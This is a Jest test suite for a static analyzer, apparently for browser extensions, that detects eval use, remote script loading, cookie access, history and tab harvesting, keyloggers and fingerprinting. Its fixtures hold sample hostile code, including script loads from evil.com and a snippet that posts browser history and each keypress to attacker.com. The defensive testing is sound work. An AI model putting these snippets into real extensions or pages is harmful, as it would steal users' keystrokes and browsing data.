/**
 * Static Analyzer Tests
 * Tests the detection of malicious code patterns through static analysis
 */

import StaticAnalyzer from '../../src/analyzers/static-analyzer.js';

describe('StaticAnalyzer', () => {
  let analyzer;

  beforeEach(() => {
    analyzer = new StaticAnalyzer();
  });

  describe('detectPatterns', () => {
    test('should detect eval patterns', () => {
      const code = `
        // Direct eval
        eval('alert("Hello")');
        
        // Function constructor
        const dynamicFunc = new Function('a', 'b', 'return a + b');
        
        // setTimeout with string
        setTimeout('doSomethingEvil()', 1000);
        
        // document.write
        document.write('<script>alert("XSS")</script>');
      `;
      
      const patterns = analyzer.detectPatterns(code, analyzer.patterns.evalPatterns);
      
      expect(patterns.length).toBeGreaterThan(3);
      expect(patterns.some(p => p.match.includes('eval'))).toBe(true);
      expect(patterns.some(p => p.match.includes('new Function'))).toBe(true);
      expect(patterns.some(p => p.match.includes('setTimeout'))).toBe(true);
      expect(patterns.some(p => p.match.includes('document.write'))).toBe(true);
    });

    test('should detect remote code loading patterns', () => {
      const code = `
        // Create and append script
        const script = document.createElement('script');
        script.src = 'https://malicious.com/evil.js';
        document.body.appendChild(script);
        
        // innerHTML with script
        element.innerHTML = '<script src="https://evil.com/hack.js"></script>';
      `;
      
      const patterns = analyzer.detectPatterns(code, analyzer.patterns.remoteCodePatterns);
      
      expect(patterns.length).toBeGreaterThan(1);
      expect(patterns.some(p => p.match.includes('createElement') && p.match.includes('script'))).toBe(true);
      expect(patterns.some(p => p.match.includes('innerHTML') && p.match.includes('<script'))).toBe(true);
    });

    test('should detect cookie theft patterns', () => {
      const code = `
        // Access document.cookie
        const cookies = document.cookie;
        
        // Chrome cookies API
        chrome.cookies.getAll({}, function(cookies) {
          sendToAttacker(cookies);
        });
        
        // Get specific cookie
        chrome.cookies.get({url: 'https://example.com', name: 'session'}, function(cookie) {
          console.log(cookie);
        });
      `;
      
      const patterns = analyzer.detectPatterns(code, analyzer.patterns.cookieTheftPatterns);
      
      expect(patterns.length).toBeGreaterThan(2);
      expect(patterns.some(p => p.match.includes('document.cookie'))).toBe(true);
      expect(patterns.some(p => p.match.includes('chrome.cookies.getAll'))).toBe(true);
      expect(patterns.some(p => p.match.includes('chrome.cookies.get'))).toBe(true);
    });

    test('should detect data exfiltration patterns', () => {
      const code = `
        // Access browser history
        chrome.history.search({text: '', maxResults: 100}, function(historyItems) {
          sendToAttacker(historyItems);
        });
        
        // Access bookmarks
        chrome.bookmarks.getTree(function(bookmarks) {
          console.log(bookmarks);
        });
        
        // Query tabs
        chrome.tabs.query({}, function(tabs) {
          const urls = tabs.map(tab => tab.url);
          sendToAttacker(urls);
        });
      `;
      
      const patterns = analyzer.detectPatterns(code, analyzer.patterns.dataExfiltrationPatterns);
      
      expect(patterns.length).toBeGreaterThan(2);
      expect(patterns.some(p => p.match.includes('chrome.history'))).toBe(true);
      expect(patterns.some(p => p.match.includes('chrome.bookmarks'))).toBe(true);
      expect(patterns.some(p => p.match.includes('chrome.tabs.query'))).toBe(true);
    });

    test('should detect keylogger patterns', () => {
      const code = `
        // Keyboard event listeners
        document.addEventListener('keydown', function(e) {
          sendKey(e.key);
        });
        
        document.addEventListener('keyup', handleKeyUp);
        
        window.addEventListener('keypress', logKeys);
        
        // Direct event properties
        document.onkeydown = captureKeys;
        input.onkeyup = function(e) { console.log(e.key); };
        form.onkeypress = handleInput;
      `;
      
      const patterns = analyzer.detectPatterns(code, analyzer.patterns.keyloggerPatterns);
      
      expect(patterns.length).toBeGreaterThan(5);
      expect(patterns.some(p => p.match.includes('keydown'))).toBe(true);
      expect(patterns.some(p => p.match.includes('keyup'))).toBe(true);
      expect(patterns.some(p => p.match.includes('keypress'))).toBe(true);
      expect(patterns.some(p => p.match.includes('onkeydown'))).toBe(true);
      expect(patterns.some(p => p.match.includes('onkeyup'))).toBe(true);
      expect(patterns.some(p => p.match.includes('onkeypress'))).toBe(true);
    });

    test('should detect fingerprinting patterns', () => {
      const code = `
        // Browser fingerprinting
        const fingerprint = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          languages: navigator.languages,
          screenWidth: screen.width,
          screenHeight: screen.height,
          colorDepth: screen.colorDepth,
          plugins: navigator.plugins,
          mimeTypes: navigator.mimeTypes
        };
        
        sendFingerprint(fingerprint);
      `;
      
      const patterns = analyzer.detectPatterns(code, analyzer.patterns.fingerprintingPatterns);
      
      expect(patterns.length).toBeGreaterThan(7);
      expect(patterns.some(p => p.match.includes('navigator.userAgent'))).toBe(true);
      expect(patterns.some(p => p.match.includes('navigator.platform'))).toBe(true);
      expect(patterns.some(p => p.match.includes('navigator.language'))).toBe(true);
      expect(patterns.some(p => p.match.includes('screen.width'))).toBe(true);
      expect(patterns.some(p => p.match.includes('screen.height'))).toBe(true);
    });
  });

  describe('calculateRiskScore', () => {
    test('should calculate risk score for benign code', () => {
      const results = {
        evalUsage: [],
        remoteCodeLoading: [],
        cookieAccess: [{ match: 'document.cookie' }],
        dataExfiltration: [],
        keylogging: [],
        fingerprinting: [
          { match: 'navigator.userAgent' },
          { match: 'navigator.language' }
        ]
      };
      
      const score = analyzer.calculateRiskScore(results);
      
      // The actual score might vary based on implementation details
      expect(score).toBeLessThan(50);
    });

    test('should calculate medium risk score for somewhat suspicious code', () => {
      const results = {
        evalUsage: [{ match: 'eval("console.log(\'test\')")' }],
        remoteCodeLoading: [],
        cookieAccess: [{ match: 'document.cookie' }],
        dataExfiltration: [{ match: 'chrome.history.search' }],
        keylogging: [],
        fingerprinting: [
          { match: 'navigator.userAgent' },
          { match: 'navigator.language' },
          { match: 'screen.width' }
        ]
      };
      
      const score = analyzer.calculateRiskScore(results);
      
      expect(score).toBeGreaterThan(20);
      expect(score).toBeLessThan(70);
    });

    test('should calculate risk score for malicious code', () => {
      const results = {
        evalUsage: [
          { match: 'eval(atob("YWxlcnQoImhhY2tlZCIpOw=="))' },
          { match: 'new Function("return document.cookie")()' }
        ],
        remoteCodeLoading: [
          { match: 'document.createElement("script")' },
          { match: 'innerHTML = "<script>"' }
        ],
        cookieAccess: [{ match: 'document.cookie' }],
        dataExfiltration: [
          { match: 'chrome.history.search' },
          { match: 'chrome.bookmarks.getTree' }
        ],
        keylogging: [
          { match: 'addEventListener("keydown")' },
          { match: 'onkeypress = function' }
        ],
        fingerprinting: [
          { match: 'navigator.userAgent' },
          { match: 'screen.width' }
        ]
      };
      
      const score = analyzer.calculateRiskScore(results);
      
      expect(score).toBeGreaterThan(90);
    });

    test('should cap risk score at 100', () => {
      const results = {
        evalUsage: [
          { match: 'eval(atob("YWxlcnQoImhhY2tlZCIpOw=="))' },
          { match: 'new Function("return document.cookie")()' }
        ],
        remoteCodeLoading: [
          { match: 'document.createElement("script")' },
          { match: 'innerHTML = "<script>"' }
        ],
        cookieAccess: [
          { match: 'document.cookie' },
          { match: 'chrome.cookies.get' }
        ],
        dataExfiltration: [
          { match: 'chrome.history.search' },
          { match: 'chrome.bookmarks.getTree' }
        ],
        keylogging: [
          { match: 'addEventListener("keydown")' },
          { match: 'onkeypress = function' }
        ],
        fingerprinting: [
          { match: 'navigator.userAgent' },
          { match: 'screen.width' }
        ]
      };
      
      const score = analyzer.calculateRiskScore(results);
      
      expect(score).toBe(100);
    });
  });

  describe('summarizeFindings', () => {
    test('should summarize findings correctly', () => {
      const results = {
        evalUsage: [{ match: 'eval' }],
        remoteCodeLoading: [],
        cookieAccess: [{ match: 'document.cookie' }],
        dataExfiltration: [],
        keylogging: [],
        fingerprinting: []
      };
      
      const summary = analyzer.summarizeFindings(results);
      
      expect(summary.length).toBe(2);
      expect(summary.some(s => s.category === 'Dynamic Code Execution')).toBe(true);
      expect(summary.some(s => s.category === 'Cookie Access')).toBe(true);
      expect(summary.every(s => s.count > 0)).toBe(true);
    });

    test('should not include categories with no findings', () => {
      const results = {
        evalUsage: [],
        remoteCodeLoading: [],
        cookieAccess: [{ match: 'document.cookie' }],
        dataExfiltration: [],
        keylogging: [],
        fingerprinting: []
      };
      
      const summary = analyzer.summarizeFindings(results);
      
      expect(summary.length).toBe(1);
      expect(summary[0].category).toBe('Cookie Access');
    });
  });

  describe('analyzeCode integration', () => {
    test('should analyze benign code correctly', () => {
      const code = `
        function greet(name) {
          return 'Hello, ' + name;
        }
        
        const userAgent = navigator.userAgent;
      `;
      
      const result = analyzer.analyzeCode(code);
      
      expect(result.riskScore).toBeLessThan(20);
      expect(result.evalUsage.length).toBe(0);
      expect(result.remoteCodeLoading.length).toBe(0);
      expect(result.cookieAccess.length).toBe(0);
      expect(result.keylogging.length).toBe(0);
    });

    test('should analyze malicious code correctly', () => {
      const code = `
        // Malicious code snippet
        eval(atob("YWxlcnQoJ2hpJyk=")); // Obfuscated eval
        
        const s = document.createElement('script');
        s.src = 'https://evil.com/payload.js';
        document.body.appendChild(s); // Remote code loading
        
        const c = document.cookie; // Cookie access
        
        chrome.history.search({text: ''}, (r) => { // History access
          fetch('https://attacker.com/history', {
            method: 'POST',
            body: JSON.stringify(r)
          });
        });
        
        document.addEventListener('keypress', (e) => { // Keylogging
          fetch('https://attacker.com/keys?k=' + e.key);
        });
      `;
      
      const result = analyzer.analyzeCode(code);
      
      expect(result.riskScore).toBeGreaterThan(70);
      expect(result.cookieAccess.length).toBeGreaterThan(0);
      expect(result.evalUsage.length).toBeGreaterThan(0);
      expect(result.remoteCodeLoading.length).toBeGreaterThan(0);
      expect(result.dataExfiltration.length).toBeGreaterThan(0);
      expect(result.keylogging.length).toBeGreaterThan(0);
    });
  });
});